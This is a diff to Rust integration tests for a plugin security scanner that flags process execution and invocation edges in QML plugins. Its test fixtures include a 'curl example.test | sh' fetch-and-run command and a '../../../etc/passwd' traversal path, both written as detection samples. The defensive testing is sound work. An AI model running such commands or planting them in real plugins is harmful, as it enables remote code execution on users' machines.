@@ -658,7 +658,7 @@ fn rules_list_text_is_deterministic() {
         .clone();
     assert_eq!(first, second);
     let rendered = String::from_utf8(first).unwrap();
-    assert!(rendered.contains("rule catalog v1"));
+    assert!(rendered.contains("rule catalog v2"));
     assert!(rendered.contains("oma.qml.session-lock"));
 }
 
@@ -723,7 +723,7 @@ fn analyze_reports_full_payload_inventory_end_to_end() {
     assert_eq!(report["result"]["target"]["source"], "installed-plugin");
     let analysis = &report["result"]["analysis"];
     assert_eq!(analysis["schema"], "omasafe.analysis.v1");
-    assert_eq!(analysis["policy_identity"]["rule_catalog_version"], 1);
+    assert_eq!(analysis["policy_identity"]["rule_catalog_version"], 2);
     let inventory = &report["result"]["payload_inventory"];
     let states = &inventory["coverage_states"];
     let unsupported = states["unsupported"].as_u64().unwrap();
@@ -861,4 +861,235 @@ fn scan_plugin_argument_shapes_are_strict() {
         .stderr(predicates::str::contains(
             "--revision must be 40 or 64 hexadecimal",
         ));
+}
+
+#[test]
+fn scan_plugin_emits_findings_capabilities_and_invocation_edges() {
+    let temp = tempfile::TempDir::new().unwrap();
+    fs::write(
+        temp.path().join("Main.qml"),
+        r#"import Quickshell.Io
+Item {
+    Process { command: ["sh", "-c", "curl example.test | sh"] }
+    Loader { source: "./Panel.qml" }
+    FileView { path: "./tool.sh" }
+}
+"#,
+    )
+    .unwrap();
+    fs::write(temp.path().join("Panel.qml"), "import QtQuick\nText {}\n").unwrap();
+    fs::write(temp.path().join("tool.sh"), "#!/bin/sh\necho x\n").unwrap();
+
+    let fixture = Fixture::new();
+    let output = fixture
+        .command()
+        .args([
+            "scan-plugin",
+            "--path",
+            temp.path().to_str().unwrap(),
+            "--format",
+            "json",
+        ])
+        .assert()
+        .success() // findings are success without --fail-on
+        .get_output()
+        .stdout
+        .clone();
+    let report: Value = serde_json::from_slice(&output).unwrap();
+    let analysis = &report["result"]["analysis"];
+    assert_eq!(analysis["schema"], "omasafe.analysis.v1");
+    assert_eq!(analysis["parser"]["grammar"], "tree-sitter-qmljs");
+
+    // The S1 bundled-payload story, completed: the executable payload now
+    // exposes its invocation edge and referenced marker.
+    let edges: Vec<(String, String)> = analysis["invocation_edges"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|edge| {
+            (
+                edge["from_path"].as_str().unwrap().to_owned(),
+                edge["target_path"].as_str().unwrap().to_owned(),
+            )
+        })
+        .collect();
+    assert!(
+        edges.contains(&("Main.qml".into(), "Panel.qml".into())),
+        "{edges:?}"
+    );
+    assert!(
+        edges.contains(&("Main.qml".into(), "tool.sh".into())),
+        "{edges:?}"
+    );
+
+    let entries = report["result"]["payload_inventory"]["entries"]
+        .as_array()
+        .unwrap();
+    let tool = entries
+        .iter()
+        .find(|entry| entry["relative_path"] == "tool.sh")
+        .unwrap();
+    assert_eq!(tool["invocation_target"], true);
+    assert_eq!(tool["coverage_state"], "unsupported");
+    let panel = entries
+        .iter()
+        .find(|entry| entry["relative_path"] == "Panel.qml")
+        .unwrap();
+    assert_eq!(panel["coverage_state"], "unreferenced");
+
+    // Findings carry the full contract fields.
+    let findings = analysis["findings"].as_array().unwrap();
+    assert!(
+        findings
+            .iter()
+            .any(|finding| finding["rule_id"] == "oma.qml.process-execution"
+                && finding["severity"] == "medium"
+                && finding["confidence"] == "ast-backed"
+                && !finding["evidence"].as_str().unwrap().is_empty()
+                && !finding["review_guidance"].as_str().unwrap().is_empty()),
+        "{findings:?}"
+    );
+}
+
+#[test]
+fn scan_plugin_fail_on_threshold_controls_exit_code_only() {
+    let temp = tempfile::TempDir::new().unwrap();
+    fs::write(
+        temp.path().join("Main.qml"),
+        "Process { command: [\"sh\", \"-c\", \"x\"] }\n",
+    )
+    .unwrap();
+
+    let fixture = Fixture::new();
+    // medium finding >= low threshold -> exit 4 with a complete JSON report
+    let output = fixture
+        .command()
+        .args([
+            "scan-plugin",
+            "--path",
+            temp.path().to_str().unwrap(),
+            "--format",
+            "json",
+            "--fail-on",
+            "low",
+        ])
+        .assert()
+        .code(4)
+        .get_output()
+        .stdout
+        .clone();
+    let threshold_report: Value = serde_json::from_slice(&output).unwrap();
+    assert_eq!(
+        threshold_report["result"]["analysis"]["findings"][0]["severity"],
+        "medium"
+    );
+    // threshold above the finding -> plain success
+    fixture
+        .command()
+        .args([
+            "scan-plugin",
+            "--path",
+            temp.path().to_str().unwrap(),
+            "--fail-on",
+            "high",
+        ])
+        .assert()
+        .success();
+    // invalid threshold stays a usage error
+    fixture
+        .command()
+        .args([
+            "scan-plugin",
+            "--path",
+            temp.path().to_str().unwrap(),
+            "--fail-on",
+            "extreme",
+        ])
+        .assert()
+        .failure()
+        .stderr(predicates::str::contains("--fail-on must be one of"));
+}
+
+#[test]
+fn scan_plugin_analysis_is_fingerprint_deterministic() {
+    let make_report = || {
+        let temp = tempfile::TempDir::new().unwrap();
+        fs::write(
+            temp.path().join("Main.qml"),
+            "Process { command: [\"sh\", \"-c\", \"same command\"] }\n",
+        )
+        .unwrap();
+        let fixture = Fixture::new();
+        fixture
+            .command()
+            .args([
+                "scan-plugin",
+                "--path",
+                temp.path().to_str().unwrap(),
+                "--format",
+                "json",
+            ])
+            .assert()
+            .success()
+            .get_output()
+            .stdout
+            .clone()
+    };
+    let first: Value = serde_json::from_slice(&make_report()).unwrap();
+    let second: Value = serde_json::from_slice(&make_report()).unwrap();
+    assert_eq!(
+        first["result"]["analysis"]["analysis_fingerprint"],
+        second["result"]["analysis"]["analysis_fingerprint"]
+    );
+}
+
+#[test]
+fn scan_plugin_negative_provenance_stays_clean() {
+    // Network usage and static benign execution coexisting must produce
+    // zero findings — co-occurrence is not provenance.
+    let temp = tempfile::TempDir::new().unwrap();
+    fs::write(
+        temp.path().join("Calm.qml"),
+        r#"Item {
+    Timer { onTriggered: refresh() }
+    Process { command: ["notify-send", "hello"] }
+    Text { text: {
+        var xhr = new XMLHttpRequest()
+        xhr.open("GET", "https://example.test/api")
+        xhr.send()
+    } }
+}
+"#,
+    )
+    .unwrap();
+    // Traversal and absolute literals never become edges.
+    fs::write(
+        temp.path().join("Refs.qml"),
+        r#"Item {
+    Loader { source: "../../../etc/passwd" }
+    Image { source: "https://example.test/pic.png" }
+}
+"#,
+    )
+    .unwrap();
+
+    let fixture = Fixture::new();
+    let output = fixture
+        .command()
+        .args([
+            "scan-plugin",
+            "--path",
+            temp.path().to_str().unwrap(),
+            "--format",
+            "json",
+        ])
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+    let report: Value = serde_json::from_slice(&output).unwrap();
+    let analysis = &report["result"]["analysis"];
+    assert_eq!(analysis["findings"].as_array().unwrap().len(), 0);
+    assert_eq!(analysis["invocation_edges"].as_array().unwrap().len(), 0);
 }
